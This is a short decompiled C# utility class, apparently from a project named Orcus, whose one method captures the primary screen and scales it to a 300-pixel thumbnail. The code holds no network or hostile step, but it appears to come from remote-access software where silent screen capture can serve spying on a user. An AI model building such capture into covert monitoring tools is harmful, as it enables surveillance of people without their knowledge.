using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Orcus.Utilities;

public class ScreenHelper
{
	public static Bitmap TakeScreenshot()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		Screen primaryScreen = Screen.get_PrimaryScreen();
		double num = (double)primaryScreen.get_Bounds().Width / (double)primaryScreen.get_Bounds().Height;
		int width = 300;
		int num2 = (int)Math.Round(300.0 / num);
		Bitmap val = new Bitmap(300, num2);
		Bitmap val2 = new Bitmap(primaryScreen.get_Bounds().Width, primaryScreen.get_Bounds().Height, (PixelFormat)2498570);
		try
		{
			Graphics val3 = Graphics.FromImage((Image)(object)val2);
			try
			{
				val3.CopyFromScreen(primaryScreen.get_Bounds().X, primaryScreen.get_Bounds().Y, 0, 0, primaryScreen.get_Bounds().Size, (CopyPixelOperation)13369376);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			Graphics val4 = Graphics.FromImage((Image)(object)val);
			try
			{
				val4.set_CompositingMode((CompositingMode)1);
				val4.set_CompositingQuality((CompositingQuality)2);
				val4.set_InterpolationMode((InterpolationMode)7);
				val4.set_SmoothingMode((SmoothingMode)2);
				val4.set_PixelOffsetMode((PixelOffsetMode)2);
				ImageAttributes val5 = new ImageAttributes();
				try
				{
					val5.SetWrapMode((WrapMode)3);
					val4.DrawImage((Image)(object)val2, new Rectangle(0, 0, width, num2), 0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height(), (GraphicsUnit)2, val5);
					return val;
				}
				finally
				{
					((IDisposable)val5)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val4)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}
}
